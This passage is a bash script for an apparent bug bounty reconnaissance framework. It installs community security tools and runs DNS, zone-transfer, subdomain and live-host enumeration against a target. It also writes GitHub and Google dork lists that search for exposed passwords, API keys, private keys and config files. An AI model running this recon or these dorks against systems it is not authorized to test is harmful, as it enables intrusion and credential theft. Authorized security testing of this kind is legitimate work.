#!/bin/bash

# ╔══════════════════════════════════════════════════════════════════════════╗
# ║          BugHunterX v3.0 — Advanced Bug Bounty Recon Framework          ║
# ║       Integrates top GitHub community tools by real researchers          ║
# ║   FOR AUTHORIZED BUG BOUNTY / PENETRATION TESTING TARGETS ONLY          ║
# ╚══════════════════════════════════════════════════════════════════════════╝

RED='\033[0;31m';    LRED='\033[1;31m'
GREEN='\033[0;32m';  LGREEN='\033[1;32m'
YELLOW='\033[1;33m'; CYAN='\033[0;36m'
BLUE='\033[0;34m';   MAGENTA='\033[0;35m'
WHITE='\033[1;37m';  GRAY='\033[0;37m'
NC='\033[0m';        BOLD='\033[1m'
BLINK='\033[5m';     DIM='\033[2m'

VERSION="3.0"
TOOL="BugHunterX"
AUTHOR="vansh-builds"
GITHUB="https://github.com/vansh-builds"
START_TIME=$(date +%s)

TARGET=""
OUTPUT_DIR=""
SCOPE_FILE=""
LOG_FILE="/dev/null"
VERBOSE=0
THREADS=50
RATE_LIMIT=150
NOTIFY_ENABLED=0
INTERACTSH_SERVER="oast.pro"

SECURITYTRAILS_API=""
SHODAN_API=""
CENSYS_API_ID=""
CENSYS_API_SECRET=""
VIRUSTOTAL_API=""
CHAOS_API=""

banner() {
    clear
    echo -e "${LRED}"
cat << 'BANNER'
 ██████╗ ██╗   ██╗ ██████╗ ██╗  ██╗██╗   ██╗███╗   ██╗████████╗███████╗██████╗ ██╗  ██╗
 ██╔══██╗██║   ██║██╔════╝ ██║  ██║██║   ██║████╗  ██║╚══██╔══╝██╔════╝██╔══██╗╚██╗██╔╝
 ██████╔╝██║   ██║██║  ███╗███████║██║   ██║██╔██╗ ██║   ██║   █████╗  ██████╔╝ ╚███╔╝
 ██╔══██╗██║   ██║██║   ██║██╔══██║██║   ██║██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗ ██╔██╗
 ██████╔╝╚██████╔╝╚██████╔╝██║  ██║╚██████╔╝██║ ╚████║   ██║   ███████╗██║  ██║██╔╝ ██╗
 ╚═════╝  ╚═════╝  ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝
BANNER
    echo -e "${NC}"
    echo -e "${CYAN}           ⚡ Advanced Bug Bounty Recon Framework v${VERSION} ⚡${NC}"
    echo -e "${GRAY}              Community tools • Smart detection • Full reporting${NC}"
    echo -e "${YELLOW}           ╔═══ AUTHORIZED BUG BOUNTY PROGRAMS ONLY ═══╗${NC}"
    echo -e "${YELLOW}           ║  Unauthorized testing is illegal (CFAA)   ║${NC}"
    echo -e "${YELLOW}           ╚═══════════════════════════════════════════╝${NC}"
    echo -e "${GRAY}              Created by ${GREEN}vansh-builds${GRAY} — github.com/vansh-builds${NC}"
    echo ""
}

log()  { echo -e "${GRAY}[$(date +%H:%M:%S)]${NC} $1" | tee -a "$LOG_FILE"; }
info() { echo -e "${CYAN}[*]${NC} $1" | tee -a "$LOG_FILE"; }
ok()   { echo -e "${GREEN}[+]${NC} $1" | tee -a "$LOG_FILE"; }
warn() { echo -e "${YELLOW}[!]${NC} $1" | tee -a "$LOG_FILE"; }
err()  { echo -e "${RED}[-]${NC} $1" | tee -a "$LOG_FILE"; }

finding() {
    local SEV="$1"
    local TYPE="$2"
    local URL="$3"
    local DETAIL="$4"
    local PROOF="$5"
    local REMED="$6"
    local TS
    TS=$(date '+%Y-%m-%d %H:%M:%S')

    case "$SEV" in
        CRITICAL) COLOR="${LRED}${BLINK}"; ICON="🔴" ;;
        HIGH)     COLOR="${LRED}";         ICON="🟠" ;;
        MEDIUM)   COLOR="${YELLOW}";       ICON="🟡" ;;
        LOW)      COLOR="${GREEN}";        ICON="🟢" ;;
        INFO)     COLOR="${CYAN}";         ICON="🔵" ;;
    esac

    echo ""
    echo -e "${COLOR}┌─[$ICON $SEV]──────────────────────────────────────────┐${NC}"
    echo -e "${COLOR}│ TYPE      : ${NC}$TYPE"
    echo -e "${COLOR}│ URL       : ${NC}$URL"
    echo -e "${COLOR}│ DETAIL    : ${NC}$DETAIL"
    echo -e "${COLOR}│ PROOF     : ${NC}$PROOF"
    echo -e "${COLOR}│ FIX       : ${NC}$REMED"
    echo -e "${COLOR}└──────────────────────────────────────────────────────┘${NC}"
    echo ""

    {
        echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        echo "SEVERITY    : $SEV"
        echo "TYPE        : $TYPE"
        echo "TIMESTAMP   : $TS"
        echo "URL         : $URL"
        echo "DETAIL      : $DETAIL"
        echo "PROOF       : $PROOF"
        echo "REMEDIATION : $REMED"
        echo ""
    } >> "$OUTPUT_DIR/findings/ALL_FINDINGS.txt"

    echo "$TS | $TYPE | $URL | $DETAIL" >> "$OUTPUT_DIR/findings/${SEV}.txt"
}

section() {
    echo ""
    echo -e "${BLUE}╔══════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${BLUE}║${NC} ${BOLD}${WHITE}$1${NC}"
    echo -e "${BLUE}╚══════════════════════════════════════════════════════════════╝${NC}"
    echo "" | tee -a "$LOG_FILE"
    echo "=== $1 ===" >> "$LOG_FILE"
}

check_tool() { command -v "$1" &>/dev/null; }

detect_env() {
    if [ -d "/data/data/com.termux" ]; then
        ENV="termux"; PKG="pkg install -y"
    elif command -v apt &>/dev/null; then
        ENV="kali"; PKG="sudo apt install -y"
    elif command -v pacman &>/dev/null; then
        ENV="arch"; PKG="sudo pacman -S --noconfirm"
    else
        ENV="unknown"; PKG="echo [Manual install needed]:"
    fi
    export GOPATH="$HOME/go"
    export PATH="$PATH:$GOPATH/bin:$HOME/.local/bin:/usr/local/go/bin"
}

create_dirs() {
    mkdir -p \
        "$OUTPUT_DIR/findings" \
        "$OUTPUT_DIR/recon/whois" \
        "$OUTPUT_DIR/recon/dns" \
        "$OUTPUT_DIR/recon/asn" \
        "$OUTPUT_DIR/recon/shodan" \
        "$OUTPUT_DIR/recon/censys" \
        "$OUTPUT_DIR/subdomains/passive" \
        "$OUTPUT_DIR/subdomains/active" \
        "$OUTPUT_DIR/subdomains/brute" \
        "$OUTPUT_DIR/subdomains/permutations" \
        "$OUTPUT_DIR/subdomains/resolved" \
        "$OUTPUT_DIR/live/http" \
        "$OUTPUT_DIR/live/https" \
        "$OUTPUT_DIR/live/interesting" \
        "$OUTPUT_DIR/ports/nmap" \
        "$OUTPUT_DIR/ports/naabu" \
        "$OUTPUT_DIR/ports/services" \
        "$OUTPUT_DIR/endpoints/dirs" \
        "$OUTPUT_DIR/endpoints/api" \
        "$OUTPUT_DIR/endpoints/params" \
        "$OUTPUT_DIR/endpoints/backup" \
        "$OUTPUT_DIR/endpoints/login" \
        "$OUTPUT_DIR/endpoints/admin" \
        "$OUTPUT_DIR/js/files" \
        "$OUTPUT_DIR/js/secrets" \
        "$OUTPUT_DIR/js/endpoints" \
        "$OUTPUT_DIR/js/sourcemaps" \
        "$OUTPUT_DIR/headers/security" \
        "$OUTPUT_DIR/headers/cors" \
        "$OUTPUT_DIR/headers/csp" \
        "$OUTPUT_DIR/vulnerabilities/xss/reflected" \
        "$OUTPUT_DIR/vulnerabilities/xss/stored" \
        "$OUTPUT_DIR/vulnerabilities/xss/dom" \
        "$OUTPUT_DIR/vulnerabilities/xss/blind" \
        "$OUTPUT_DIR/vulnerabilities/sqli/error" \
        "$OUTPUT_DIR/vulnerabilities/sqli/blind" \
        "$OUTPUT_DIR/vulnerabilities/sqli/time" \
        "$OUTPUT_DIR/vulnerabilities/sqli/oob" \
        "$OUTPUT_DIR/vulnerabilities/sqli/sqlmap" \
        "$OUTPUT_DIR/vulnerabilities/ssrf/internal" \
        "$OUTPUT_DIR/vulnerabilities/ssrf/cloud" \
        "$OUTPUT_DIR/vulnerabilities/ssrf/blind" \
        "$OUTPUT_DIR/vulnerabilities/lfi/read" \
        "$OUTPUT_DIR/vulnerabilities/lfi/rce" \
        "$OUTPUT_DIR/vulnerabilities/rce/ssti" \
        "$OUTPUT_DIR/vulnerabilities/rce/command" \
        "$OUTPUT_DIR/vulnerabilities/rce/deserialization" \
        "$OUTPUT_DIR/vulnerabilities/idor" \
        "$OUTPUT_DIR/vulnerabilities/auth/bypass" \
        "$OUTPUT_DIR/vulnerabilities/auth/brokenauth" \
        "$OUTPUT_DIR/vulnerabilities/auth/jwt" \
        "$OUTPUT_DIR/vulnerabilities/open_redirect" \
        "$OUTPUT_DIR/vulnerabilities/cors" \
        "$OUTPUT_DIR/vulnerabilities/cswsh" \
        "$OUTPUT_DIR/vulnerabilities/host_header" \
        "$OUTPUT_DIR/vulnerabilities/subdomain_takeover" \
        "$OUTPUT_DIR/vulnerabilities/cve" \
        "$OUTPUT_DIR/vulnerabilities/secrets/aws" \
        "$OUTPUT_DIR/vulnerabilities/secrets/gcp" \
        "$OUTPUT_DIR/vulnerabilities/secrets/azure" \
        "$OUTPUT_DIR/vulnerabilities/secrets/github" \
        "$OUTPUT_DIR/vulnerabilities/secrets/api_keys" \
        "$OUTPUT_DIR/vulnerabilities/secrets/tokens" \
        "$OUTPUT_DIR/vulnerabilities/info_disclosure/backup" \
        "$OUTPUT_DIR/vulnerabilities/info_disclosure/git" \
        "$OUTPUT_DIR/vulnerabilities/info_disclosure/config" \
        "$OUTPUT_DIR/vulnerabilities/info_disclosure/debug" \
        "$OUTPUT_DIR/vulnerabilities/business_logic" \
        "$OUTPUT_DIR/vulnerabilities/prototype_pollution" \
        "$OUTPUT_DIR/vulnerabilities/graphql" \
        "$OUTPUT_DIR/screenshots" \
        "$OUTPUT_DIR/wordlists" \
        "$OUTPUT_DIR/raw"
    LOG_FILE="$OUTPUT_DIR/scan.log"
    touch "$LOG_FILE"
    ok "Output directory: $OUTPUT_DIR"
}

install_tools() {
    section "INSTALLING TOOLS (Community GitHub Tools)"
    detect_env

    info "Installing system packages..."
    if [ "$ENV" = "termux" ]; then
        pkg update -y
        pkg install -y git curl wget python python-pip golang ruby \
            nmap dnsutils whois jq libxml2 figlet sqlite vim bc openssl
    elif [ "$ENV" = "kali" ]; then
        sudo apt update -y
        sudo apt install -y git curl wget python3 python3-pip golang-go \
            ruby-full nmap dnsutils whois jq libxml2-utils figlet lolcat \
            masscan nikto dirb wfuzz sqlmap whatweb chromium-driver \
            eyewitness wafw00f bc libssl-dev 2>/dev/null
    fi

    export GOPATH="$HOME/go"
    export PATH="$PATH:$GOPATH/bin:/usr/local/go/bin"

    info "Installing Python tools..."
    pip3 install --upgrade pip 2>/dev/null
    pip3 install \
        requests beautifulsoup4 dnspython \
        wafw00f arjun dirsearch uro \
        shodan censys \
        truffleHog 2>/dev/null

    info "Installing Go-based community tools..."

    declare -A GO_TOOLS
    GO_TOOLS["subfinder"]="github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest"
    GO_TOOLS["amass"]="github.com/owasp-amass/amass/v4/...@master"
    GO_TOOLS["assetfinder"]="github.com/tomnomnom/assetfinder@latest"
    GO_TOOLS["dnsx"]="github.com/projectdiscovery/dnsx/cmd/dnsx@latest"
    GO_TOOLS["shuffledns"]="github.com/projectdiscovery/shuffledns/cmd/shuffledns@latest"
    GO_TOOLS["puredns"]="github.com/d3mondev/puredns/v2@latest"
    GO_TOOLS["alterx"]="github.com/projectdiscovery/alterx/cmd/alterx@latest"
    GO_TOOLS["httpx"]="github.com/projectdiscovery/httpx/cmd/httpx@latest"
    GO_TOOLS["httprobe"]="github.com/tomnomnom/httprobe@latest"
    GO_TOOLS["naabu"]="github.com/projectdiscovery/naabu/v2/cmd/naabu@latest"
    GO_TOOLS["katana"]="github.com/projectdiscovery/katana/cmd/katana@latest"
    GO_TOOLS["gospider"]="github.com/jaeles-project/gospider@latest"
    GO_TOOLS["hakrawler"]="github.com/hakluke/hakrawler@latest"
    GO_TOOLS["waybackurls"]="github.com/tomnomnom/waybackurls@latest"
    GO_TOOLS["gau"]="github.com/lc/gau/v2/cmd/gau@latest"
    GO_TOOLS["gauplus"]="github.com/bp0lr/gauplus@latest"
    GO_TOOLS["x8"]="github.com/Sh1Yo/x8@latest"
    GO_TOOLS["ffuf"]="github.com/ffuf/ffuf/v2@latest"
    GO_TOOLS["gobuster"]="github.com/OJ/gobuster/v3@latest"
    GO_TOOLS["nuclei"]="github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest"
    GO_TOOLS["dalfox"]="github.com/hahwul/dalfox/v2@latest"
    GO_TOOLS["kxss"]="github.com/Emoe/kxss@latest"
    GO_TOOLS["gxss"]="github.com/KathanP19/Gxss@latest"
    GO_TOOLS["crlfuzz"]="github.com/dwisiswant0/crlfuzz/cmd/crlfuzz@latest"
    GO_TOOLS["corsme"]="github.com/shivangx01b/CorsMe@latest"
    GO_TOOLS["ppmap"]="github.com/kleiton0x00/ppmap@latest"
    GO_TOOLS["interactsh-client"]="github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest"
    GO_TOOLS["subjack"]="github.com/haccer/subjack@latest"
    GO_TOOLS["subzy"]="github.com/LukaSikic/subzy@latest"
    GO_TOOLS["getJS"]="github.com/003random/getJS@latest"
    GO_TOOLS["jsluice"]="github.com/BishopFox/jsluice/cmd/jsluice@latest"
    GO_TOOLS["mantra"]="github.com/MrEmpy/mantra@latest"
    GO_TOOLS["gf"]="github.com/tomnomnom/gf@latest"
    GO_TOOLS["qsreplace"]="github.com/tomnomnom/qsreplace@latest"
    GO_TOOLS["anew"]="github.com/tomnomnom/anew@latest"
    GO_TOOLS["unfurl"]="github.com/tomnomnom/unfurl@latest"
    GO_TOOLS["trufflehog"]="github.com/trufflesecurity/trufflehog/v3@latest"
    GO_TOOLS["gitleaks"]="github.com/gitleaks/gitleaks@latest"
    GO_TOOLS["s3scanner"]="github.com/sa7mon/S3Scanner@latest"
    GO_TOOLS["notify"]="github.com/projectdiscovery/notify/cmd/notify@latest"
    GO_TOOLS["mapcidr"]="github.com/projectdiscovery/mapcidr/cmd/mapcidr@latest"
    GO_TOOLS["tlsx"]="github.com/projectdiscovery/tlsx/cmd/tlsx@latest"
    GO_TOOLS["cdncheck"]="github.com/projectdiscovery/cdncheck/cmd/cdncheck@latest"
    GO_TOOLS["cvemap"]="github.com/projectdiscovery/cvemap/cmd/cvemap@latest"
    GO_TOOLS["uncover"]="github.com/projectdiscovery/uncover/cmd/uncover@latest"
    GO_TOOLS["asnmap"]="github.com/projectdiscovery/asnmap/cmd/asnmap@latest"

    for tool in "${!GO_TOOLS[@]}"; do
        if [ -n "${GO_TOOLS[$tool]}" ]; then
            if check_tool "$tool"; then
                ok "$tool already installed"
            else
                info "Installing $tool..."
                if go install "${GO_TOOLS[$tool]}" 2>/dev/null; then
                    # Refresh PATH so newly installed binary is found
                    export PATH="$PATH:$GOPATH/bin:$HOME/.local/bin:/usr/local/go/bin"
                    ok "$tool installed"
                else
                    warn "$tool failed to install"
                fi
            fi
        fi
    done

  info "Installing GF patterns..."
mkdir -p "$HOME/.gf"

# Disable git auth prompts — if repo is private/deleted, skip silently
export GIT_TERMINAL_PROMPT=0

# tomnomnom core (always works)
git clone --quiet https://github.com/tomnomnom/gf /tmp/gf_tool 2>/dev/null \
    && cp /tmp/gf_tool/examples/*.json "$HOME/.gf/" 2>/dev/null \
    && ok "GF core patterns installed" \
    || warn "GF core clone failed — skipping"

# 1ndianl33t patterns (may be private/deleted)
git clone --quiet https://github.com/1ndianl33t/Gf-Patterns /tmp/gf_extra 2>/dev/null \
    && cp /tmp/gf_extra/*.json "$HOME/.gf/" 2>/dev/null \
    && ok "1ndianl33t GF patterns installed" \
    || warn "1ndianl33t GF patterns unavailable — skipping"

# NitinYadav00 patterns (may be private/deleted)
git clone --quiet https://github.com/NitinYadav00/My-GF-Patterns /tmp/gf_more 2>/dev/null \
    && cp /tmp/gf_more/*.json "$HOME/.gf/" 2>/dev/null \
    && ok "NitinYadav00 GF patterns installed" \
    || warn "NitinYadav00 GF patterns unavailable — skipping"

ok "GF patterns setup complete"

    info "Installing SecLists wordlists..."
    if [ ! -d "$HOME/SecLists" ]; then
        git clone --quiet --depth=1 https://github.com/danielmiessler/SecLists "$HOME/SecLists" 2>/dev/null
        ok "SecLists downloaded"
    else
        ok "SecLists already present"
    fi

    info "Downloading DNS resolvers..."
    mkdir -p "$HOME/resolvers"
    curl -s "https://raw.githubusercontent.com/trickest/resolvers/main/resolvers.txt" \
        -o "$HOME/resolvers/resolvers.txt" 2>/dev/null
    ok "Resolvers downloaded"

    info "Updating Nuclei templates..."
    nuclei -update-templates 2>/dev/null
    git clone --quiet https://github.com/projectdiscovery/nuclei-templates "$HOME/nuclei-templates" 2>/dev/null || \
        (cd "$HOME/nuclei-templates" && git pull --quiet 2>/dev/null)
    git clone --quiet https://github.com/geeknik/the-nuclei-templates "$HOME/nuclei-templates-extra" 2>/dev/null || true
    git clone --quiet https://github.com/medbsq/ncl "$HOME/nuclei-templates-ncl" 2>/dev/null || true
    ok "Nuclei templates updated"

    pip3 install cloud-enum graphw00f trufflehog 2>/dev/null

    echo ""
    echo -e "${LGREEN}╔═══════════════════════════════════════════╗${NC}"
    echo -e "${LGREEN}║     ALL TOOLS INSTALLED SUCCESSFULLY      ║${NC}"
    echo -e "${LGREEN}╚═══════════════════════════════════════════╝${NC}"
}

phase_passive_recon() {
    section "PHASE 1 — PASSIVE RECON & INTEL GATHERING"

    info "WHOIS lookup..."
    whois "$TARGET" > "$OUTPUT_DIR/recon/whois/whois.txt" 2>/dev/null
    REGISTRAR=$(grep -i "Registrar:" "$OUTPUT_DIR/recon/whois/whois.txt" | head -1 | cut -d: -f2 | xargs)
    EXPIRY=$(grep -i "Registry Expiry\|Expiration" "$OUTPUT_DIR/recon/whois/whois.txt" | head -1 | cut -d: -f2- | xargs)
    ok "Registrar: $REGISTRAR | Expires: $EXPIRY"

    info "Full DNS enumeration..."
    {
        for t in A AAAA MX NS TXT SOA CNAME CAA SRV; do
            echo "=== $t ==="
            dig +short "$t" "$TARGET" 2>/dev/null
            echo ""
        done
    } > "$OUTPUT_DIR/recon/dns/dns_records.txt"

    info "Testing DNS Zone Transfer (AXFR)..."
    NS_SERVERS=$(dig +short NS "$TARGET" 2>/dev/null)
    while IFS= read -r ns; do
        AXFR=$(dig @"$ns" AXFR "$TARGET" 2>/dev/null | grep -v "^;")
        if echo "$AXFR" | grep -q "$TARGET"; then
            echo "$AXFR" > "$OUTPUT_DIR/recon/dns/zone_transfer_${ns}.txt"
            finding "CRITICAL" "DNS Zone Transfer" "$TARGET" \
                "DNS Zone Transfer allowed via nameserver $ns" \
                "dig @$ns AXFR $TARGET" \
                "Disable AXFR on $ns. Only allow zone transfers to authorized secondary DNS servers."
        fi
    done <<< "$NS_SERVERS"

    info "Checking SPF/DMARC..."
    SPF=$(dig +short TXT "$TARGET" 2>/dev/null | grep "v=spf")
    DMARC=$(dig +short TXT "_dmarc.$TARGET" 2>/dev/null | grep "v=DMARC")
    if [ -z "$SPF" ]; then
        finding "MEDIUM" "Missing SPF Record" "$TARGET" \
            "No SPF record found — domain may be spoofable" \
            "dig +short TXT $TARGET (no SPF returned)" \
            "Add SPF TXT record: v=spf1 include:yourmailprovider.com ~all"
    fi
    if [ -z "$DMARC" ]; then
        finding "MEDIUM" "Missing DMARC Record" "$TARGET" \
            "No DMARC policy found — email spoofing may be possible" \
            "dig +short TXT _dmarc.$TARGET (no DMARC returned)" \
            "Add DMARC TXT record: v=DMARC1; p=reject; rua=mailto:dmarc@$TARGET"
    fi

    if check_tool asnmap; then
        info "ASN enumeration..."
        asnmap -d "$TARGET" -silent > "$OUTPUT_DIR/recon/asn/asn_ranges.txt" 2>/dev/null
        ok "ASN ranges: $(wc -l < "$OUTPUT_DIR/recon/asn/asn_ranges.txt") CIDRs found"
    fi

    if check_tool tlsx; then
        info "TLS certificate analysis..."
        echo "$TARGET" | tlsx -silent -json > "$OUTPUT_DIR/recon/dns/tls_info.json" 2>/dev/null
        jq -r '.san[]?' "$OUTPUT_DIR/recon/dns/tls_info.json" 2>/dev/null \
            | sort -u > "$OUTPUT_DIR/subdomains/passive/cert_sans.txt"
        ok "TLS SANs found: $(wc -l < "$OUTPUT_DIR/subdomains/passive/cert_sans.txt")"
    fi

    info "Fetching cert transparency logs (crt.sh)..."
    curl -s "https://crt.sh/?q=%.${TARGET}&output=json" 2>/dev/null \
        | jq -r '.[].name_value' 2>/dev/null \
        | sed 's/\*\.//g' | sort -u \
        > "$OUTPUT_DIR/subdomains/passive/crt_sh.txt"
    ok "crt.sh: $(wc -l < "$OUTPUT_DIR/subdomains/passive/crt_sh.txt") entries"

    if [ -n "$CHAOS_API" ] && check_tool chaos; then
        info "Fetching from Chaos dataset..."
        chaos -d "$TARGET" -key "$CHAOS_API" -silent \
            > "$OUTPUT_DIR/subdomains/passive/chaos.txt" 2>/dev/null
        ok "Chaos: $(wc -l < "$OUTPUT_DIR/subdomains/passive/chaos.txt")"
    fi

    if [ -n "$SHODAN_API" ]; then
        info "Querying Shodan..."
        curl -s "https://api.shodan.io/dns/domain/${TARGET}?key=${SHODAN_API}" 2>/dev/null \
            | jq -r '.subdomains[]?' 2>/dev/null \
            | sed "s/$/.${TARGET}/" \
            > "$OUTPUT_DIR/recon/shodan/subdomains.txt"
        TARGET_IP=$(dig +short A "$TARGET" | head -1)
        if [ -n "$TARGET_IP" ]; then
            curl -s "https://api.shodan.io/shodan/host/${TARGET_IP}?key=${SHODAN_API}" 2>/dev/null \
                > "$OUTPUT_DIR/recon/shodan/host_info.json"
            OPEN_PORTS=$(jq -r '.ports[]?' "$OUTPUT_DIR/recon/shodan/host_info.json" 2>/dev/null | tr '\n' ',')
            ok "Shodan open ports: $OPEN_PORTS"
        fi
    fi

    if check_tool uncover; then
        info "Running Uncover (multi-engine OSINT)..."
        uncover -q "ssl:$TARGET" -silent \
            > "$OUTPUT_DIR/recon/shodan/uncover_results.txt" 2>/dev/null
        ok "Uncover: $(wc -l < "$OUTPUT_DIR/recon/shodan/uncover_results.txt") results"
    fi

    info "Historical URL collection (Wayback + GAU)..."
    if check_tool waybackurls; then
        echo "$TARGET" | waybackurls > "$OUTPUT_DIR/endpoints/params/wayback.txt" 2>/dev/null
    fi
    if check_tool gau; then
        gau --threads 5 --subs "$TARGET" \
            >> "$OUTPUT_DIR/endpoints/params/wayback.txt" 2>/dev/null
    fi
    if check_tool gauplus; then
        gauplus -t 5 -random-agent "$TARGET" \
            >> "$OUTPUT_DIR/endpoints/params/wayback.txt" 2>/dev/null
    fi
    sort -u "$OUTPUT_DIR/endpoints/params/wayback.txt" \
        -o "$OUTPUT_DIR/endpoints/params/wayback.txt" 2>/dev/null
    ok "Historical URLs: $(wc -l < "$OUTPUT_DIR/endpoints/params/wayback.txt")"

    if [ -n "$SECURITYTRAILS_API" ]; then
        info "Querying SecurityTrails..."
        curl -s "https://api.securitytrails.com/v1/domain/$TARGET/subdomains?children_only=false&include_inactive=true" \
            -H "APIKEY: $SECURITYTRAILS_API" 2>/dev/null \
            | jq -r '.subdomains[]?' 2>/dev/null \
            | sed "s/$/.${TARGET}/" \
            > "$OUTPUT_DIR/subdomains/passive/securitytrails.txt"
        ok "SecurityTrails: $(wc -l < "$OUTPUT_DIR/subdomains/passive/securitytrails.txt")"
    fi

    if [ -n "$VIRUSTOTAL_API" ]; then
        info "Querying VirusTotal..."
        curl -s "https://www.virustotal.com/vtapi/v2/domain/report?apikey=${VIRUSTOTAL_API}&domain=${TARGET}" \
            2>/dev/null | jq -r '.subdomains[]?' 2>/dev/null \
            > "$OUTPUT_DIR/subdomains/passive/virustotal.txt"
        ok "VirusTotal: $(wc -l < "$OUTPUT_DIR/subdomains/passive/virustotal.txt")"
    fi

    info "Generating GitHub dork queries..."
    cat > "$OUTPUT_DIR/recon/whois/github_dorks.txt" << EOF
# GitHub Dork Queries
"$TARGET" password
"$TARGET" secret
"$TARGET" api_key
"$TARGET" apikey
"$TARGET" token
"$TARGET" private_key
"$TARGET" access_key
"$TARGET" auth
"$TARGET" credential
"$TARGET" db_password
"$TARGET" database_url
"$TARGET" smtp_password
"$TARGET" .env
"$TARGET" config.php
"$TARGET" begin rsa private key
EOF

    cat > "$OUTPUT_DIR/recon/whois/google_dorks.txt" << EOF
# Google Dork Queries
site:$TARGET filetype:pdf OR filetype:xls OR filetype:xlsx OR filetype:doc OR filetype:csv
site:$TARGET inurl:admin OR inurl:administrator OR inurl:panel OR inurl:dashboard
site:$TARGET inurl:login OR inurl:signin OR inurl:auth OR inurl:wp-login.php
site:$TARGET inurl:api OR inurl:graphql OR inurl:rest OR inurl:v1 OR inurl:v2
site:$TARGET inurl:config OR inurl:configuration OR inurl:settings OR inurl:setup
site:$TARGET inurl:backup OR inurl:dump OR inurl:bak OR inurl:old OR inurl:archive
site:$TARGET inurl:.env OR inurl:env.txt OR inurl:environment
site:$TARGET inurl:debug OR inurl:test OR inurl:dev OR inurl:staging
site:$TARGET intext:"index of" OR intext:"directory listing"
site:$TARGET intext:"SQL syntax" OR intext:"mysql_fetch" OR intext:"ORA-"
site:$TARGET ext:log OR ext:txt intext:password
site:pastebin.com "$TARGET" password OR key OR token
site:github.com "$TARGET" password OR secret OR key OR token
EOF

    ok "Google + GitHub dorks saved"
}

phase_subdomain_enum() {
    section "PHASE 2 — SUBDOMAIN ENUMERATION"

    if check_tool subfinder; then
        info "Subfinder (all sources)..."
        subfinder -d "$TARGET" -all -recursive -silent \
            -o "$OUTPUT_DIR/subdomains/passive/subfinder.txt" 2>/dev/null
        ok "Subfinder: $(wc -l < "$OUTPUT_DIR/subdomains/passive/subfinder.txt")"
    fi

    if check_tool assetfinder; then
        info "Assetfinder..."
        assetfinder --subs-only "$TARGET" \
            > "$OUTPUT_DIR/subdomains/passive/assetfinder.txt" 2>/dev/null
        ok "Assetfinder: $(wc -l < "$OUTPUT_DIR/subdomains/passive/assetfinder.txt")"
    fi

    if check_tool amass; then
        info "Amass passive (120s timeout)..."
        timeout 120 amass enum -passive -d "$TARGET" \
            -o "$OUTPUT_DIR/subdomains/passive/amass.txt" 2>/dev/null
        ok "Amass: $(wc -l < "$OUTPUT_DIR/subdomains/passive/amass.txt" 2>/dev/null || echo 0)"
    fi

    cat "$OUTPUT_DIR/subdomains/passive/"*.txt 2>/dev/null \
        | sort -u > "$OUTPUT_DIR/subdomains/all_passive.txt"
    ok "Passive total: $(wc -l < "$OUTPUT_DIR/subdomains/all_passive.txt") unique subdomains"

    if check_tool dnsx; then
        info "Resolving subdomains with dnsx..."
        dnsx -l "$OUTPUT_DIR/subdomains/all_passive.txt" \
            -r "$HOME/resolvers/resolvers.txt" \
            -silent -a -resp \
            -o "$OUTPUT_DIR/subdomains/resolved/resolved.txt" 2>/dev/null
        ok "Resolved: $(wc -l < "$OUTPUT_DIR/subdomains/resolved/resolved.txt")"
    fi

    WORDLISTS=(
        "$HOME/SecLists/Discovery/DNS/subdomains-top1million-20000.txt"
        "$HOME/SecLists/Discovery/DNS/dns-Jhaddix.txt"
        "$HOME/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt"
    )
    if check_tool puredns; then
        for WL in "${WORDLISTS[@]}"; do
            if [ -f "$WL" ]; then
                info "PureDNS brute force: $(basename "$WL")..."
                puredns bruteforce "$WL" "$TARGET" \
                    -r "$HOME/resolvers/resolvers.txt" \
                    --write "$OUTPUT_DIR/subdomains/brute/$(basename "$WL" .txt)_brute.txt" \
                    2>/dev/null
                ok "Brute force done"
                break
            fi
        done
    fi

    if check_tool alterx; then
        info "AlterX subdomain permutation generation..."
        cat "$OUTPUT_DIR/subdomains/all_passive.txt" | alterx -silent \
            > "$OUTPUT_DIR/subdomains/permutations/alterx.txt" 2>/dev/null
        ok "AlterX permutations: $(wc -l < "$OUTPUT_DIR/subdomains/permutations/alterx.txt")"
        if check_tool dnsx; then
            dnsx -l "$OUTPUT_DIR/subdomains/permutations/alterx.txt" \
                -silent -o "$OUTPUT_DIR/subdomains/permutations/resolved_perms.txt" 2>/dev/null
            ok "Resolved permutations: $(wc -l < "$OUTPUT_DIR/subdomains/permutations/resolved_perms.txt")"
        fi
    fi

    cat "$OUTPUT_DIR/subdomains/passive/"*.txt \
        "$OUTPUT_DIR/subdomains/brute/"*.txt \
        "$OUTPUT_DIR/subdomains/permutations/resolved_perms.txt" \
        "$OUTPUT_DIR/subdomains/resolved/resolved.txt" \
        2>/dev/null | grep -oP "[a-zA-Z0-9.\-]+\.$TARGET" \
        | sort -u > "$OUTPUT_DIR/subdomains/MASTER_SUBDOMAINS.txt"

    TOTAL=$(wc -l < "$OUTPUT_DIR/subdomains/MASTER_SUBDOMAINS.txt")
    ok "MASTER list: $TOTAL unique subdomains"
    finding "INFO" "Subdomain Enumeration Complete" "$TARGET" \
        "$TOTAL subdomains discovered" \
        "See $OUTPUT_DIR/subdomains/MASTER_SUBDOMAINS.txt" \
        "Review for forgotten/dev/staging subdomains"
}

phase_live_hosts() {
    section "PHASE 3 — LIVE HOST DETECTION & FINGERPRINTING"

    if ! check_tool httpx; then
        warn "httpx not found — skipping live detection"
        return
    fi

    info "Running httpx full fingerprint..."
    httpx \
        -l "$OUTPUT_DIR/subdomains/MASTER_SUBDOMAINS.txt" \
        -silent \
        -status-code \
        -title \
        -tech-detect \
        -content-length \
        -web-server \
        -ip \
        -cdn \
        -cname \
        -location \
        -follow-redirects \
        -threads "$THREADS" \
        -rate-limit "$RATE_LIMIT" \
        -json \
        -o "$OUTPUT_DIR/live/http/httpx_full.json" 2>/dev/null

    if [ -f "$OUTPUT_DIR/live/http/httpx_full.json" ]; then
        jq -r '[.url, .status_code|tostring, .title, (.tech[]?)] | join(" | ")' \
            "$OUTPUT_DIR/live/http/httpx_full.json" 2>/dev/null \
